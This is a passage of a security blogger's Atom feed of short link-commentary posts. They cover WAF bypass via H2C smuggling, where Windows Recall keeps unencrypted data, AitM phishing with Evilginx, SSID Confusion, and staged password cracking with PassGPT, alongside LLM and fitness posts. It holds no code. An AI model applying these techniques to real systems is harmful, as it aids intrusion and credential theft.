&lt;li&gt;Bypassing WAF via the WAF using shared certificates or WAF IP whitelisting. Great trick and the thought process is similar to bypassing conditional access rules.&lt;&#x2F;li&gt;
&lt;li&gt;Bypassing on-premise or reverse proxy based WAFs via H2C smuggling is an underrated bypass method.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Building LLMs: Insights</title>
        <published>2024-06-07T00:00:00+00:00</published>
        <updated>2024-06-07T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/llm-learnings/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/llm-learnings/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.oreilly.com&#x2F;radar&#x2F;what-we-learned-from-a-year-of-building-with-llms-part-i&quot;&gt;What We Learned from a Year of Building with LLMs (Part I)&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I still find LLMs mysterious in some ways and at times it doesn&#x27;t steer towards the answers I&#x27;m expecting. This article does help demystify my assumptions of how things work, a structure that can be followed, and goes a bit further without going deep into the weeds.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;We recommend starting with prompting when developing new applications. It’s easy to both underestimate and overestimate its importance. It’s underestimated because the right prompting techniques, when used correctly, can get us very far. It’s overestimated because even prompt-based applications require significant engineering around the prompt to work well.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Prompt engineering does take time but it does pay off especially when scaled across a community as seen in the frameworks like &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;danielmiessler&#x2F;fabric&quot;&gt;Fabric&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Focus on getting the most out of fundamental prompting techniques. A few prompting techniques have consistently helped improve performance across various models and tasks: n-shot prompts + in-context learning, chain-of-thought, and providing relevant resources.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Structured input and output help models better understand the input as well as return output that can reliably integrate with downstream systems.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Have small prompts that do one thing, and only one thing, well.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;The chain-of-thought technique can be referred as a step-by-step learning process to enable complex reasoning abilities. I find it helpful in situations where you get stuck with a generative piece of code of which does not make sense. It is easier to reason your way through a final result rather than relying on a zero shot prompt. You&#x27;ll see this quite often if you start diving into malware development.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The quality of your RAG’s output is dependent on the quality of retrieved documents, which in turn can be considered along a few factors.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The first and most obvious metric is relevance. This is typically quantified via ranking metrics such as Mean Reciprocal Rank (MRR) or Normalized Discounted Cumulative Gain (NDCG).&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Like traditional recommendation systems, the rank of retrieved items will have a significant impact on how the LLM performs on downstream tasks.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Second, we also want to consider information density. If two documents are equally relevant, we should prefer one that’s more concise and has lesser extraneous details.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Finally, consider the level of detail provided in the document. The additional detail could help the LLM better understand the semantics of the table and thus generate more correct SQL.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;RAG can be precise in output based on the context given. However, RAG does struggles with specific keyword-based search such as names, acronyms, ID and etc. Implementation of vector databases attempt to solve this problem but..&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;We’ve been communicating this to our customers and partners for months now. Nearest Neighbor Search with naive embeddings yields very noisy results and you’re likely better off starting with a keyword-based approach.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;It&#x27;s not perfect nor it may not be the right solution to begin with. A hybrid search technique may be the better approach to improve the relevance of search results by fusing the traditional keyword-based search technique and modern way of ranking of results into vector embeddings. As a result:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;In most cases, a hybrid will work best: keyword matching for the obvious matches, and embeddings for synonyms, hypernyms, and spelling errors, as well as multimodality (e.g., images and text).&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;What about instances where you want to add new knowledge to an LLM? Is it better to retrain a model or keep RAG data as relevant as possible?&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Beyond improved performance, RAG comes with several practical advantages too. First, compared to continuous pretraining or fine-tuning, it’s easier—and cheaper!—to keep retrieval indices up-to-date. Second, if our retrieval indices have problematic documents that contain toxic or biased content, we can easily drop or modify the offending documents.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;I heard that RAG is going out of style because as LLM context windows grows in size, there is no need for RAG anymore.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;While it’s true that long contexts will be a game-changer for use cases such as analyzing multiple documents or chatting with PDFs, the rumors of RAG’s demise are greatly exaggerated. First, even with a context window of 10M tokens, we’d still need a way to select information to feed into the model. Second, beyond the narrow needle-in-a-haystack eval, we’ve yet to see convincing data that models can effectively reason over such a large context. Thus, without good retrieval (and ranking), we risk overwhelming the model with distractors, or may even fill the context window with completely irrelevant information.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Finally, there’s cost. The Transformer’s inference cost scales quadratically (or linearly in both space and time) with context length. Just because there exists a model that could read your organization’s entire Google Drive contents before answering each question doesn’t mean that’s a good idea.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This only goes to show LLM tech stack is still maturing and I think most developers are throwing whatever solution to a problem and see how it performs. As an example, working on agent workflows seems complicated to be fine tuning:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Small tasks with clear objectives make for the best agent or flow prompts. It’s not required that every agent prompt requests structured output, but structured outputs help a lot to interface with whatever system is orchestrating the agent’s interactions with the environment.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
Some things to try:
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;An explicit planning step, as tightly specified as possible. Consider having predefined plans to choose from (c.f. https:&#x2F;&#x2F;youtu.be&#x2F;hGXhFa3gzBs?si=gNEGYzux6TuB1del).&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Rewriting the original user prompts into agent prompts. Be careful, this process is lossy!&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Agent behaviors as linear chains, DAGs, and State-Machines; different dependency and logic relationships can be more and less appropriate for different scales. Can you squeeze performance optimization out of different task architectures?&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Planning validations; your planning can include instructions on how to evaluate the responses from other agents to make sure the final assembly works well together.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Prompt engineering with fixed upstream state—make sure your agent prompts are evaluated against a collection of variants of what may happen before.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;IDK, for a mere mortal that is tinkering with this stuff on and off during weekends, it&#x27;s time consuming and everchanging. I&#x27;ll stick with the agentless stuff for now and leave the over engineering stuff to the pros.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>TotalRecall: Recall is worst than I thought</title>
        <published>2024-06-06T00:00:00+00:00</published>
        <updated>2024-06-06T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/totalrecall-recall/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/totalrecall-recall/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;xaitax&#x2F;TotalRecall&quot;&gt;TotalRecall - a &#x27;privacy nightmare&#x27;?&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Windows Recall stores everything locally in an unencrypted SQLite database, and the screenshots are simply saved in a folder on your PC. Here’s where you can find them: &lt;code&gt;C:\Users\$USER\AppData\Local\CoreAIPlatform.00\UKP\{GUID}&lt;&#x2F;code&gt;. The images are all stored in the following subfolder &lt;code&gt;.\ImageStore\&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;TotalRecall copies the databases and screenshots and then parses the database for potentially interesting artifacts. You can define dates to limit the extraction as well as search for strings (that were extracted via Recall OCR) of interest. There is no rocket science behind all this. It&#x27;s very basic SQLite parsing.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;During testing this with an off the shelf infostealer, I used Microsoft Defender for Endpoint — which detected the off the shelve infostealer — but by the time the automated remediation kicked in (which took over ten minutes) my Recall data was already long gone.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;In enterprise, you have to turn off Recall as it is enabled by default.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Well this is worst than I &lt;a href=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;wiretap&#x2F;microsoft-recall&#x2F;&quot;&gt;thought&lt;&#x2F;a&gt;, unencrypted SQLite and raw images stored in AppData, Microsoft didn&#x27;t even bother with DPAPI. It&#x27;s like they rolled out from alpha and didn&#x27;t even GAF about security.&lt;&#x2F;p&gt;
&lt;p&gt;I like the blurb about infostealer. It&#x27;s like a smash and grab of data and who gives AF about your endpoint security, data has been exfiltrated already.&lt;&#x2F;p&gt;
&lt;p&gt;Enterprise editions of Windows has Recall enabled by default 🤦 Enough of this shit show, let&#x27;s see how they will fix this in Windows 15 😏&lt;&#x2F;p&gt;
&lt;p&gt;EDIT: just to clarify, I&#x27;m not hating on the idea that Recall or AI is useless, I think it&#x27;s a useful piece of tech that will change the way you interface with your computer and offload tasks to Edge compute. Whether this is bad or good is up for the user to decide, there are choices. My gripe is how the data is being contained and handled.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Hacking Millions of Modems</title>
        <published>2024-06-05T00:00:00+00:00</published>
        <updated>2024-06-05T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/hacking-millions-modem/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/hacking-millions-modem/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;samcurry.net&#x2F;hacking-millions-of-modems&quot;&gt;Hacking Millions of Modems (and investigating who hacked my modem)&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Potentially related to the other story that I mentioned about &lt;a href=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;wiretap&#x2F;china-orbs-network&#x2F;&quot;&gt;China&#x27;s ORBs network&lt;&#x2F;a&gt;. Interesting how the author accidently stumbled upon a replay of his own HTTP network traffic and connected the two dots together at a much later time that it may have been used for a C&amp;amp;C traffic. It kind of got me thinking if I were to be in this same situation, would I have notice that my modem has been compromised? Hard to say because external traffic monitoring isn&#x27;t common from a home perspective especially if you have FTTP (Fiber to the Premises). In addition, if your day-to-day internet usage isn&#x27;t affected by visible&#x2F;noisy MitM type behaviors (thanks to SSL&#x2F;TLS) or sluggish network performance&#x2F;reliability, most people wouldn&#x27;t suspect a thing or fall back to power cycling the modem which doesn&#x27;t completely fix the root issue. Depending on the ISP, you are at mercy at remote push updates as the ISP need to adhere a configuration standard. It is wise of owning your modem and delegate the routing process to a router with monitoring and alerting capabilities like pfSense. Modem&#x2F;router combos tend to suck anyway.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>TerminalTextEffects: Because why not?</title>
        <published>2024-06-04T00:00:00+00:00</published>
        <updated>2024-06-04T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/terminal-text-effects/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/terminal-text-effects/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;chrisbuilds.github.io&#x2F;terminaltexteffects&#x2F;img&#x2F;application_demos&#x2F;shadow_title_blackhole.gif&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;chrisbuilds.github.io&#x2F;terminaltexteffects&#x2F;&quot;&gt;TerminalTextEffects&lt;&#x2F;a&gt; (TTE) is a terminal visual effects engine. TTE can be installed as a system application to produce effects in your terminal, or as a Python library to enable effects within your Python scripts&#x2F;applications.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;God damn.. this is awesome! You can pipe any CLI command into &lt;code&gt;tte&lt;&#x2F;code&gt; and it will produce a text effect. I do have a presentation coming up for a larger audience, I could use this for the &amp;quot;lulz&amp;quot; effect. &lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Tracking AitM Campaigns</title>
        <published>2024-06-03T00:00:00+00:00</published>
        <updated>2024-06-03T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/aitm-campaigns/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/aitm-campaigns/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.lab539.com&#x2F;blog&#x2F;6-months-tracking-aitm-campaigns&quot;&gt;A summary of 6 Months Tracking AitM Campaigns&lt;&#x2F;a&gt;
and
&lt;a href=&quot;https:&#x2F;&#x2F;pushsecurity.com&#x2F;blog&#x2F;phishing-2-0-how-phishing-toolkits-are-evolving-with-aitm&quot;&gt;how phishing toolkits are evolving with AitM&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I wonder if my phishing infrastrucutre was part of this data collection 😅. I&#x27;ve been testing and ramping up usage of Evilginx for my own engagements and it works surprisingly well especially when combined with post exploitation toolkits like ROADtools, TokenTatics, and AzureHound. Based on the attack paths and techniques I&#x27;m seeing in the environment today, I can envision more automation features coming in the future releases using Selenium or Puppeteer. I mean, what is stopping me from doing this using python scripting amirite?&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Midpoint Longevity and Injury Prevention Protocol</title>
        <published>2024-06-02T00:00:00+00:00</published>
        <updated>2024-06-02T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/exercise-protocol/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/exercise-protocol/</id>
        
        <content type="html">&lt;p&gt;I&#x27;ve been thinking about injury prevention and longevity for quite some time. Training load management and recovery from muscle and joint pain is now a priority due to age. Here is my list of priorities, reminders, and protocols that has worked out well for me thus far:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Do not lift heavy 💩 like in your 20&#x27;s if you are not in your 20&#x27;s. Youth rewards the bold and egos destroy the old. Focus on the age bracket biological peaks and valleys, less on the past PR&#x27;s.&lt;&#x2F;li&gt;
&lt;li&gt;If not training for any specific event but want to maintain or slowly build fitness: focus more on lighter sessions with higher rep range. More volume will maintain or build fitness overtime and it has less forces to your body (injury prevention). However, heavy sessions will be required but it will be less frequent and targeted (lower reps at heavy load generates higher forces which means higher chances of injury).&lt;&#x2F;li&gt;
&lt;li&gt;Finding a balance between lighter and heavier sessions will be determined based on the individual goals and fitness level. This part usually takes the most time figuring out or you can stick with the consensus of two sessions per muscle per week, one or two sets per muscle per session, and move up in weight if you are able to recover faster than expected. It&#x27;s better to start slow than lift heavy until it falls apart.&lt;&#x2F;li&gt;
&lt;li&gt;When moving up in weight, add 5 kg increments at a time and work on it until you feel like your gains has adapted. You can tell based on the status of your recovery.&lt;&#x2F;li&gt;
&lt;li&gt;Don&#x27;t start lifting heavy without warming up. Perform mobilization techniques to bias the joints and muscle for optimal performance and increase range of motion.&lt;&#x2F;li&gt;
&lt;li&gt;I am not a fan of PR&#x27;ing as it doesn&#x27;t align with long tail objectives. If that is part of your fitness goals, go for it. I&#x27;d much prefer tracking total load&#x2F;set&#x2F;rep over time than PR&#x27;ing a single set.&lt;&#x2F;li&gt;
&lt;li&gt;Observe the broader horizon by seeing how consistently you can show up to the training sessions without feeling like trash or sidelined by injuries.&lt;&#x2F;li&gt;
&lt;li&gt;Pro tip: slower eccentric control will help with injury prevention and maximize muscle growth with less effort. Don&#x27;t be those guys who rapidly lift and dump weights. Focus on technique.&lt;&#x2F;li&gt;
&lt;li&gt;Pro tip 2: briefly pause at the bottom of the lift to get the deep stretch and strengthing range of motion. As you age, you will lose mobility and flexiblity so it&#x27;s best to keep it as flexy as possible. Side bends is a general indicator of how much time was put into mobility work.&lt;&#x2F;li&gt;
&lt;li&gt;Pro tip 3: build a specific training routine and start tracking it. This will keep you on track of training loads and responses to determine if you can safely maintain, increase the load, or need additional rest days. Ideally, your training plan would be segmented into training blocks so you don&#x27;t need to think too hard about it. Lastly, you don&#x27;t have all day to spend time at a gym so make the best out of the training routine that maxes out 1.5 hours on average. Training with heavy fatigue on easy days won&#x27;t do you any good and increase chance of injury over the long term. Train smarter, not harder.&lt;&#x2F;li&gt;
&lt;li&gt;Resting is key to cap gains at the end of a training block. Resting for a longer stretch of time is also needed after a long repetitive training block.&lt;&#x2F;li&gt;
&lt;li&gt;Don&#x27;t care about training blocks? The general advice is deloading every 4-5 weeks. Deloading phase will help renormalize the sensitivity to training responses and as a result it increases performance for the next training session.&lt;&#x2F;li&gt;
&lt;li&gt;It&#x27;s not just about the physical muscular gains, take care of the nervous system as well. When you are not listening to your body and you overreach the limit, stress takes a toll and delays max performance plans even further. Stay within the limits most of the time and overreach when required specifically (don&#x27;t just wing it).&lt;&#x2F;li&gt;
&lt;li&gt;Add mobility and stretching into the training routine. It&#x27;s incredible how stretching under load has helped my long standing pains in my elbow and knees.&lt;&#x2F;li&gt;
&lt;li&gt;Bulletproofing your knees and ankles is a worthwhile quality of life investment over the long term.&lt;&#x2F;li&gt;
&lt;li&gt;When 💩 happens and it does in unexpected ways, it&#x27;s simple, rest longer than usual. When ready, get back into it with lower frequency and volume.&lt;&#x2F;li&gt;
&lt;li&gt;What about the other stuff that I didn&#x27;t mention like contrast therapy, massages, eating habits, and blah blah blah. If you think it works, do it. I&#x27;m not a health pro, I&#x27;m just an avid reader and seeker of knowing what works based on my own results and experimentation.&lt;&#x2F;li&gt;
&lt;li&gt;Again, stop doing stupid 💩 (It happens but worth reminding anyway 😅).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>OSINT process of a Data Dump Admin</title>
        <published>2024-06-01T00:00:00+00:00</published>
        <updated>2024-06-01T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/breachforums-osint/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/breachforums-osint/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;arden22.substack.com&#x2F;p&#x2F;pompompurin-and-breachforums&quot;&gt;Pompompurin and BreachForums&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;A nicely put together OSINT investigation which started from SoundCloud to doxxing of admin&#x27;s family members, killer. Not surprised, sloppy handling of OPSEC was the downfall for the individual.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Operational Relay Box Networks (ORBs)</title>
        <published>2024-05-31T00:00:00+00:00</published>
        <updated>2024-05-31T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/china-orbs-network/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/china-orbs-network/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;cyberscoop.com&#x2F;china-hacking-operational-relay-box-networks&quot;&gt;Chinese-linked hacking units increasingly use &#x27;ORBs&#x27; to obfuscate espionage&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The obfuscation networks — known as “operational relay box networks,” or ORBs — are not operated directly by government-controlled hacking units, the researchers said. Instead, they’re administered by contractors or other administrators within China and are frequently used by multiple Chinese government-linked hacking campaigns as part of espionage or reconnaissance efforts.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ORB networks are composed of “nodes,” or individual physical or virtual devices, that are typically routers or leased virtual private servers&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;ORB network-hosted infrastructure, such as domains or IP addresses, have a short lifespan, meaning that traditional clues and indicators used by defenders to spot and remedy adversarial operations are increasingly less relevant&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;“Rather than waiting to be reactive, or responsive to block each IP as an indicator of compromise, you should be trying to look at the patterns of infrastructure that they’re registering,  what types of routers they are compromising, what ports and services do we know that they’re coming from,”&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;With the number of cheap IoT smart home devices that people are buying from crapazon, I wouldn&#x27;t be surprised if this number grows larger in size than it already has. Although, these contractors are targeting modems and routers for a reason, less firewall restrictions (if any) and low visibility for detection. The easy way to find out if your device has been compromised is noticing if your IP is being blackholed or blacklisted by websites. Call in ISP for a new one and all good. Who needs security am I right?&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Offensive AI Tooling: Finally Arrived?</title>
        <published>2024-05-30T00:00:00+00:00</published>
        <updated>2024-05-30T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/xforce-red-ai-offsec/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/xforce-red-ai-offsec/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.theregister.com&#x2F;2024&#x2F;05&#x2F;13&#x2F;ai_xforce_red_penetration&quot;&gt;AI red-teaming tools helped X-Force break into a major tech manufacturer &#x27;in 8 hours&#x27;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;quot;In this particular case, the X-Force crew and its AI tooling found a flaw in the manufacturer&#x27;s HR portal, exploited this to upload a shell, and then waited to see if they would get caught. They didn&#x27;t, so they pushed further, escalating their privileges on the host, and used a rootkit to cover their tracks and avoid being detected.&amp;quot;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;quot;Then we just sat and waited, mapped up their internal network over time, and eventually got to the design of that key computer component,&amp;quot; Thompson said. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Not to say that this wasn&#x27;t predicted already by many experts, this is coming sooner than we think. Several predictions can be made based on what I&#x27;ve observed in the past 6 months:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Bug bounty hunters are going to be come more competitive especially those who know how to augment AI observance tech&#x2F;agents.&lt;&#x2F;li&gt;
&lt;li&gt;A new competition battleground. Imagine Battle Bots but for Offensive LLM&#x27;s to compete capture the flags or real world bounty programs. Leading models will get bought or licensed by public&#x2F;private sectors.&lt;&#x2F;li&gt;
&lt;li&gt;A greater importance of shifting left in the software development lifecycle and ASR vulnerability management. Hopefully, this would lead to fostering a better security culture rather than a time consuming process.&lt;&#x2F;li&gt;
&lt;li&gt;An internal threat adversary model will exist to look out for existing gaps in the network. Give it an employee profile to mimic and all the knowledge of internal tools it needs, it will endlessly monitor and find a way to either laterally move or escalate privileges. This would help in use cases where making a network-wide rules&#x2F;permission change but unsure what the adverse effects are.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>SSID Confusion: EvilTwin Remix?</title>
        <published>2024-05-29T00:00:00+00:00</published>
        <updated>2024-05-29T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/ssid-confusion/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/ssid-confusion/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.top10vpn.com&#x2F;research&#x2F;wifi-vulnerability-ssid&#x2F;&quot;&gt;SSID Confusion - CVE-2023-52424&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;From a home perspective, no impact unless you are using WPA3. From an enterprise perspective, it&#x27;s a new man-in-the-middle attack path against WPA3. Unlike EvilTwin which focuses on spoofing an SSID, SSID Confusion targets the validation mechanism of the SSID name during connection setup. More specifically, an adversary sets up a rogue AP on a different channel, advertising the target network&#x27;s SSID. The attacker then performs a multi-channel man-in-the-middle attack to make the victim&#x27;s device believe it has connected to the trusted network. What makes this attack particularly clever is its ability to deceive the target connected to a 5Ghz band into connecting back to the same SSID using 2.4GHz frequency band which lacks robust security features. Easy fix: don&#x27;t reuse the password for both 2.4Ghz and 5Ghz SSID.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Practical Password Cracking with a Modern Touch</title>
        <published>2024-05-28T00:00:00+00:00</published>
        <updated>2024-05-28T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/practical-password-cracking/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/practical-password-cracking/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;sean-t-smith&#x2F;pwned-by-passgpt&#x2F;blob&#x2F;main&#x2F;Practical%20Password%20Cracking%20-%20Hardware%2C%20Tools%2C%20Methods%20and%20AI%20-%20vF.pdf&quot;&gt;Practical password cracking - hardware, tools, methods, and AI&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Great walkthrough presentation about how to approach password cracking in a smarter and practical way. The multi-stage approach starting from easy to hard:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;known passwords and dictionary words&lt;&#x2F;li&gt;
&lt;li&gt;brute-force of lower number of characters (1-8)&lt;&#x2F;li&gt;
&lt;li&gt;character mask attack for larger number of characters (9-12)&lt;&#x2F;li&gt;
&lt;li&gt;digit brute force 13-14 characters long&lt;&#x2F;li&gt;
&lt;li&gt;rules usage and multiple wordlist combinations&lt;&#x2F;li&gt;
&lt;li&gt;rules usage and weakpass wordlist combinations&lt;&#x2F;li&gt;
&lt;li&gt;LLM dictionary&lt;&#x2F;li&gt;
&lt;li&gt;rules usage and LLM dictionary combinations&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The new discovery was the part where it mentions using an LLM model called PassGPT to brute force passwords that are 10-16 characters long. Based on the given stats, 150K cracked out of 39 billion keyspace within 3 days is quite impressive as the final dictionary size is the most difficult to crack.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Microsoft Recall: FML</title>
        <published>2024-05-23T00:00:00+00:00</published>
        <updated>2024-05-23T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/microsoft-recall/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/microsoft-recall/</id>
        
        <content type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;wiretap&#x2F;microsoft-recall&#x2F;%22https:&#x2F;&#x2F;support.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;privacy-and-control-over-your-recall-experience-d404f672-7647-41e5-886c-a3c59680af15%22&quot;&gt;Privacy and control over your Recall experience&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Hey look, Windows built-in a keylogger without the need of installing one because of &amp;quot;AI productivity&amp;quot;. The fact that they do not perform content moderation on captured data containing passwords and sensitive information will be a treasure trove for hackers and potentially abusive friends&#x2F;family to reveal what you read&#x2F;viewed&#x2F;accessed. Even though it has the ability to filter out certain applications from being &amp;quot;Recalled,&amp;quot; how many users out there actually know how?&lt;&#x2F;p&gt;
&lt;p&gt;The user experience is similar when using BitLocker. How many users thought that the first thing during initial setup was to enable BitLocker? From what I&#x27;ve commonly seen in the past, most people will skip that part for later because saving&#x2F;storing a recovery key may be seen as a nuisance and less likely to be revisited to complete the steps. Users wouldn&#x27;t even know that they need it as the computer is working as intended to get their job done.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Look Ma, I did something..</title>
        <published>2023-12-31T00:00:00+00:00</published>
